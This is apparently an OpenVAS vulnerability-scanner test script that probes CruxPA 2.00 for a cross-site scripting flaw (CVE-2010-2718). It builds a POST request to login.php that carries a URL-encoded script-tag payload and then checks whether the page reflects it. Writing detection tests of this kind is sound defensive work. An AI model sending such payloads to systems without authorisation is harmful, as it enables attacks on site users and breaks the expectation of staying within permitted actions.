##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cruxpa_xss_vuln.nasl 5306 2017-02-16 09:00:16Z teissa $
#
# CruxPA 'txtusername' and 'todo' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801383");
  script_version("$Revision: 5306 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)");
  script_cve_id("CVE-2010-2718");
  script_bugtraq_id(41495);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("CruxPA 'txtusername' and 'todo' Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/1709");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/xss_vulnerability_in_cruxpa_3.html");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/xss_vulnerability_in_cruxpa_2.html");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/512243/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_crux_products_detect.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "insight" , value : "The flaw is caused by input validation errors in the 'login.php'
  and 'addtodo.php' scripts when processing the 'txtusername' and 'todo'
  parameters.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running CruxPA and is prone to cross site scripting
  vulnerability.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute
  arbitrary scripting code in the user's browser.

  Impact Level: Application.");
  script_tag(name : "affected" , value : "CruxPA version 2.00");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

cmsPort = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:cmsPort, app:"CruxPA")) exit(0);

if(dir == "/") dir = "";

## Try an exploit
filename = string(dir + "/login.php");
host = http_host_name(port:cmsPort);
authVariables ="txtusername=%22%3E%3Cscript%3Ealert%28123456%29%3C%2F" +
               "script%3E&txtpassword=&cmdSubmit=Submit";

## Construct post request
sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "Accept-Language: en-us,en;q=0.5\r\n",
                "Accept-Encoding: gzip,deflate\r\n",
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                "Keep-Alive: 300\r\n",
                "Connection: keep-alive\r\n",
                "Referer: http://", host, filename, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);
rcvRes = http_keepalive_send_recv(port:cmsPort, data:sndReq);

## Check the Response
if(rcvRes =~ "HTTP/1\.. 200" && ">alert(123456)</script>" >< rcvRes){
  security_message(port:cmsPort);
  exit(0);
}

exit(99);
